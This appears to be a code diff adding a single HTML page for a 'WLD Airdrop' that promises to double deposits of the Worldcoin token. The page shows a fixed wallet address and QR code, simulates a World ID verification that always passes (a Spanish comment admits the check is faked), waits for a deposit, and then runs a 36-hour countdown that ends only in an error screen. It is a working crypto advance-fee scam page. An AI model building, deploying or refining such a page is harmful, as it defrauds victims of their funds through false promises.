@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WLD Airdrop</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{
+  width:100%;
+  height:100%;
+  font-family:Inter,system-ui,sans-serif;
+  background:#f2f2f2;
+  overflow:hidden;
+}
+
+.center{
+  height:100%;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+}
+
+/* LOGO */
+.logo{
+  width:90px;
+  animation:spin 20s linear infinite;
+}
+@keyframes spin{
+  from{transform:rotateY(0)}
+  to{transform:rotateY(360deg)}
+}
+
+/* AIRDROP TEXT */
+.airdrop-text{
+  margin-top:22px;
+  font-weight:700;
+  letter-spacing:2px;
+}
+.airdrop-text span{
+  display:block;
+  font-size:18px;
+  opacity:0;
+  animation:airdrop 6s infinite;
+}
+.airdrop-text span:nth-child(1){animation-delay:0s}
+.airdrop-text span:nth-child(2){animation-delay:1.5s}
+.airdrop-text span:nth-child(3){animation-delay:3s}
+.airdrop-text .highlight{font-size:32px}
+@keyframes airdrop{
+  0%{opacity:0;transform:translateY(20px)}
+  20%{opacity:1;transform:translateY(0)}
+  70%{opacity:1}
+  100%{opacity:0;transform:translateY(-20px)}
+}
+
+/* WORLD ID */
+#widBox button{
+  margin-top:26px;
+  padding:14px 30px;
+  border:none;
+  border-radius:10px;
+  background:#000;
+  color:#fff;
+  letter-spacing:2px;
+  cursor:pointer;
+}
+
+/* QR */
+.qr-box{
+  display:none;
+  margin-top:26px;
+}
+.qr-box img{
+  width:160px;
+  background:#fff;
+  padding:12px;
+  border-radius:14px;
+}
+.qr-box p{
+  margin-top:10px;
+  font-size:14px;
+  letter-spacing:2px;
+}
+
+/* COPY */
+.deposit-code{
+  display:none;
+  margin-top:14px;
+}
+.deposit-code input{
+  width:320px;
+  padding:10px;
+  text-align:center;
+  border-radius:6px;
+  border:1px solid #ccc;
+}
+.deposit-code button{
+  margin-top:10px;
+  padding:10px 22px;
+  border:none;
+  border-radius:6px;
+  background:#000;
+  color:#fff;
+  cursor:pointer;
+}
+#copyMsg{
+  display:block;
+  margin-top:6px;
+  font-size:12px;
+  opacity:0;
+}
+
+/* STATUS */
+.status{
+  margin-top:16px;
+  font-size:14px;
+  letter-spacing:1px;
+}
+
+/* TIMER */
+.countdown{
+  display:none;
+  margin-top:20px;
+  font-size:18px;
+  letter-spacing:2px;
+}
+
+/* ERROR */
+.error{
+  display:none;
+  margin-top:30px;
+}
+.error h2{color:#b00000}
+.error button{
+  margin-top:12px;
+  padding:10px 22px;
+  border:none;
+  border-radius:6px;
+  background:#000;
+  color:#fff;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="center">
+
+  <img src="logowld.png" class="logo">
+
+  <div class="airdrop-text">
+    <span>100% EARN AIRDROP</span>
+    <span>DEPOSIT UP TO 20 WLD</span>
+    <span class="highlight">GET 40 WLD</span>
+  </div>
+
+  <!-- WORLD ID -->
+  <div id="widBox">
+    <button onclick="verifyWorldID()">VERIFY WITH WORLD ID</button>
+  </div>
+
+  <!-- QR -->
+  <div class="qr-box" id="qrBox">
+    <img src="qr.png">
+    <p>SCAN QR TO DEPOSIT</p>
+  </div>
+
+  <!-- COPY -->
+  <div class="deposit-code" id="depositBox">
+    <input id="addr" readonly
+      value="0xf8af1505beb8a37207eb1f019ded31dd08fc571c">
+    <button onclick="copyAddr()">COPY ADDRESS</button>
+    <span id="copyMsg">Copied ✓</span>
+  </div>
+
+  <div class="status" id="status"></div>
+
+  <!-- TIMER -->
+  <div class="countdown" id="timer"></div>
+
+  <!-- ERROR -->
+  <div class="error" id="errorBox">
+    <h2>❌ ERROR</h2>
+    <button onclick="restart()">RETRY</button>
+  </div>
+
+</div>
+
+<script>
+/* ========= CONFIG ========= */
+const TOTAL_SECONDS = 36 * 60 * 60;
+let seconds = TOTAL_SECONDS;
+let interval;
+
+/* ========= WORLD ID (SIMULADO) ========= */
+function verifyWorldID(){
+  // Acá va World ID real. Simulamos OK:
+  document.getElementById("widBox").style.display="none";
+  showDeposit();
+}
+
+/* ========= SHOW DEPOSIT ========= */
+function showDeposit(){
+  qrBox.style.display="block";
+  depositBox.style.display="block";
+  status.textContent="Waiting for deposit…";
+  waitForDeposit();
+}
+
+/* ========= WAIT DEPOSIT ========= */
+async function waitForDeposit(){
+  try{
+    const r = await fetch("/deposit-status");
+    const j = await r.json();
+
+    if(j.deposited){
+      status.textContent="Deposit detected ✔";
+      startTimer();
+    }else{
+      setTimeout(waitForDeposit, 5000);
+    }
+  }catch(e){
+    status.textContent="Connection error";
+    setTimeout(waitForDeposit, 5000);
+  }
+}
+
+/* ========= TIMER ========= */
+function startTimer(){
+  timer.style.display="block";
+  interval = setInterval(()=>{
+    if(seconds<=0){
+      clearInterval(interval);
+      timer.style.display="none";
+      qrBox.style.display="none";
+      depositBox.style.display="none";
+      errorBox.style.display="block";
+      return;
+    }
+    seconds--;
+    const h=String(Math.floor(seconds/3600)).padStart(2,"0");
+    const m=String(Math.floor((seconds%3600)/60)).padStart(2,"0");
+    const s=String(seconds%60).padStart(2,"0");
+    timer.textContent=`TIME LEFT ${h}:${m}:${s}`;
+  },1000);
+}
+
+/* ========= COPY ========= */
+function copyAddr(){
+  navigator.clipboard.writeText(addr.value);
+  copyMsg.style.opacity=1;
+  setTimeout(()=>copyMsg.style.opacity=0,1500);
+}
+
+/* ========= RESTART ========= */
+function restart(){
+  seconds = TOTAL_SECONDS;
+  errorBox.style.display="none";
+  status.textContent="";
+  widBox.style.display="block";
+}
+</script>
+
+</body>
+</html>
